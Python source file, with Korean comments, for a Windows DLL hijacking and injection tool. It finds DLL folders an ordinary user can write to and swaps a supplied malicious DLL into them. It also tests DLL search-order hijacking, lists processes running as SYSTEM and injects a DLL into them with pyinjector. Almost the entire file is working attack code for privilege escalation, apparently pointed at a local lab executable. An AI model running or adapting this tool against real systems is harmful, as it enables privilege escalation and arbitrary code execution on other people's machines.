import os, signal
from tqdm import tqdm
from pyinjector import inject
import subprocess
import psutil
import shutil
from pywinauto import *
import time
class hiJacking():
    def hiJacking(self):
        pass
    #Listdlls.exe 파일을 이용하여 입력된 pid에서 로드하는 dll 목록을 가져옴
    def list_dll(self,pid):
        stream = os.popen("Listdlls.exe " + str(pid))
        dlls = stream.read()
        program_name = ""
        list_dlls = []
        list_programs = []
        path_lists = []
        # try:
        #     program_name = dlls.split("\n")[7]
        #     program_name = program_name.replace("Command line: ", '').replace('"', '').replace(' -bystartup','').replace('\\','/')
        #     if not program_name.endswith('.exe'):
        #         raise Exception("not exe File")
        # except:
        #     print("Wrong pid...")
        
        
        # if 'C:/' not in program_name:
        #     name_split = program_name.split('/')
        #     name = name_split[-1]
        #     for dirpath, dirname, filename in tqdm(os.walk("C:/")):
        #         if name in filename:
        #             program_name =  os.path.join(dirpath, name)

        # split_text = dlls.replace("\\","/").replace(' ', '\n').split('\n')
        try:
            split_text = dlls.replace("\\","/").replace('  ','\n').split('\n')
            
       
            for i in split_text:
                path_lists.append(i.replace(" ",""))
            
            for i in path_lists:
                if i.endswith(".exe"):
                    list_programs.append(i)
                if i.endswith(".dll"):
                    list_dlls.append(i)   
            for i in list_programs:
                if i.startswith("C:/"):
                    program_name = i
        except:
            print("Wrong pid...")
        return program_name, list_dlls
        
        #dll이 저장되어 있는 폴더의 일반 유저 또한 쓰기 권한이 있는지 검증
    def check_permission(self,path):
        user_perm_dir = []
        user_perm_file = []
        for i in path:
            dir_path = os.path.dirname(i)
            try:
                open(dir_path+"/test.txt","w")
                os.remove(dir_path+"/test.txt")
                name_split = i.split('/')
                name = name_split[-1]
                user_perm_file.append(name)
                user_perm_dir.append(i)
                # if os.access(dir_path,os.W_OK):
                #     name_split = i.split('/')
                #     name = name_split[-1]
                #     user_perm_file.append(name)
                #     user_perm_dir.append(i)
            except:
                pass
        return user_perm_file,user_perm_dir
    #strings 명령어를 이용하여 dll을 하드코딩으로 로드하는지 확인
    def find_string(self,name,list_name,list_dir):
        stream = os.popen("strings " + name)
        strings = stream.read()
        strings = strings.replace("\\",'/').split("\n")
        string_dll = []
        for i in strings:
            if i.endswith(".dll"):
                string_dll.append(i)
        for string in string_dll:
            if  string in list_name:
                return True
            elif string in list_dir:
                return True
            else:
                return False
    #exe파일을 직접 실행하여 pid를 가져옴
    def create_process(self,path):
            return subprocess.Popen([path]).pid
        
    #악성 dll을 입력받은 경로로 바꿔줌
    def change_dll(self,dll_path,hijactable_dll_path,program_name):
        successed_list = []
        try:
            tmp = os.environ['TMP']
            for i in hijactable_dll_path:
                
                original_name_list = i.split('/')
                original_name = original_name_list[-1]
                path = tmp.replace("\\","/") + "/" + original_name
                dir_path = os.path.dirname(i)
                shutil.move(i,tmp)
                shutil.copy2(dll_path,i)
                pid = dll_hijact.create_process(program_name)
                app = application.Application()
                app.connect(process=pid)
                
                try:
                    message = app.window(title_re="SECU") 
                    message.OKButton.click()
                    successed_list.append(i)
                    psutil.Process(pid).kill()
                except:
                    pass
                time.sleep(0.1)  # import time
                os.remove(i)
                shutil.move(path,dir_path)
        except Exception as e:
            print("Cannot remove or write DLL")
            print(e)
        return successed_list
    def search_order_hijack(self,pid):
        program_name, list_dlls = self.list_dll(pid)
        program_path = os.path.dirname(program_name)
        changed_path = []
        search_order_path = []
        for i in list_dlls:
            name_split = i.split('/')
            name = name_split[-1]
            search_order_path.append(program_path + "/" + name)
            
        for i in range(len(list_dlls)):
            try:
                shutil.copy2(list_dlls[i],search_order_path[i])
                changed_path.append(search_order_path[i])
            except:
                print(list_dlls[i] + "  1순위 복사 에러")
        newPid = self.create_process(program_name)
        program_name, newList_dlls = self.list_dll(newPid)
        
        # successed_path = {}
        # for i in range(len(newList_dlls)):
        #     if newList_dlls[i] in changed_path:
        #         successed_path[list_dlls[i]] = newList_dlls[i]


        successed_path = {}

        for i in newList_dlls:
            if i in changed_path:
                name_split = i.split('/')
                name = name_split[-1]
                
                for j in list_dlls:
                    name2_split = j.split('/')
                    name2 = name2_split[-1]
                    if name == name2:
                        successed_path[i] = j


        psutil.Process(newPid).kill()
        #psutil.Process(pid).kill()
        
            
        for i in changed_path:
                try:
                    os.remove(i)
                except:
                    print(i + " : cannot remove file")
        
        return successed_path
        
    # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
    # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
    def normal_hijack(self,pid):
        successed_list = []
        program_name, list_dlls = self.list_dll(pid)
        file_list,dir_list = self.check_permission(list_dlls)
        if not len(dir_list) == 0:
            if self.find_string(program_name,file_list,dir_list):
                print("Detect programs vulnerable to dll injection")
                
                print("Vulnerable Program Name : " + program_name)
                psutil.Process(pid).kill()
                successed_list = self.change_dll(path_dll,dir_list,program_name)
                print("Vulnerable dll Lists : ")
                for i in successed_list:
                    print(i)
            else:
                print("Nah....")
        else:
            print("Not Found writable dir")
        return successed_list
class injection():
    def injection(self):
        pass
    #SYSTEM 권한으로 실행되는 프로세스 파싱, return 값 => pid
    def find_process(self):
        proc_lists = []
        try:
            # 실행중인 프로세스를 순차적으로 검색
            for proc in psutil.process_iter():
            # 프로세스 이름을 ps_name에 할당
                ps_name = proc.name()
                # 실행 명령어와 인자(argument)를 리스트 형식으로 가져와 cmdline에 할당
                cmdline = proc.cmdline()
                
                username = proc.username()
                if username.endswith('SYSTEM'):
                    proc_lists.append(proc.ppid())
                print('NAME:', ps_name, ' CMD:', cmdline, ' userName: ', username)
            return proc_lists
        except:
            pass
        
        
     
    #find_process에서 찾은 pid를 악성 dll을 이용하여 인젝션 해보기
    def attack(self,pid,path_dll):
        inject(pid,path_dll)


if __name__=='__main__': 
    dll_inject = injection()
    dll_hijact = hiJacking()
    path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
    path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
    pid = dll_hijact.create_process(path_exe)
    #inject(pid,path_dll)
    #pid = dll_hijact.create_process("C:/Users/CodeByO/Desktop/test/crackme1.exe")
    # success = dll_hijact.search_order_hijack(20588)    
    # for i,j in success.items():
    #     print(i,j)
    
    lists = dll_hijact.normal_hijack(pid)
    